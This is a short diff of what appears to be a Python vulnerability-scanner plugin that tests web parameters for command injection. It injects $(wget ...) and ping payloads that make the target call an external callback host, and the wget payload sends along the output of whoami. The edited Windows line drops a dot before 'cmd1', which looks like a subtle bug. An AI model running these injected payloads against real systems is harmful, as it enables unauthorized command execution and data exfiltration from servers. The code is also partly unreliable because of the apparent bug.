@@ -102,11 +102,11 @@ def checkCmd(place, parameter, value):
 # http://www.wooyun.org/bugs/wooyun-2010-0192038
 def checkCmd1(place, parameter, value):
     host = conf.hostname
-    cmd = "$(curl  " + conf.hostname + ".curl" + CLOUDEYE + conf.path + '/?-->' + parameter + "/whoami=`whoami`)"
+    cmd = "$(wget  " + conf.hostname + ".cmd1" + CLOUDEYE + conf.path + '/?-->' + parameter + "/whoami=`whoami`)"
     linuxpayload = agent.payload(place, parameter, value, cmd)
     Request.queryPage(linuxpayload, place, raise404=False)
     b64path = string.replace(base64.b64encode(conf.path), "=", "", 2)
-    wincmd =  "$( ping -n 1 " + parameter +"."+ b64path+"."+conf.hostname + ".curl" + CLOUDEYE + ")"
+    wincmd =  "$( ping -n 1 " + parameter +"."+ b64path+"."+conf.hostname + "cmd1" + CLOUDEYE + ")"
     # -n 1 option detect linux
     winpayload = agent.payload(place, parameter, value, wincmd)
     Request.queryPage(winpayload, place, raise404=False)
